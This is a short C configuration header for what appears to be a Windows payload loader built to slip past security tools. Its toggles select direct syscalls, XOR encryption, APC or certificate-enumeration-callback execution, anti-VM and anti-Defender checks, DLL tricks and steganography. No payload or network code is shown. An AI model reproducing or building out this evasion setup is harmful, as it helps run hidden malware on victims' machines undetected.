#pragma once
#include <Windows.h>
#include "Struct.h"
//  ====================  CONFIG  ==========================
static BOOLEAN isSyscall = TRUE;
static EncryptMethod encryptMethod = CASE_XOR;
static ExecutionMethod ExecMethod = AlertAPC;
static EnumMethod enumMethod = CASE_CertEnumSystemStore;
static BOOLEAN EnableAntiVM = FALSE;
static BOOLEAN AntiDefenderVM = FALSE;
static BOOLEAN trick_DllGetClassObject = TRUE;
static BOOLEAN trick_SxInDll = TRUE;
static AllocateMethod allocateMethod = CASE_NtAllocateVirtualMemory;
static BOOLEAN checkVXQQ = FALSE;
static BOOLEAN EnableSteg = TRUE;
// ==================== CONFIG END ==========================
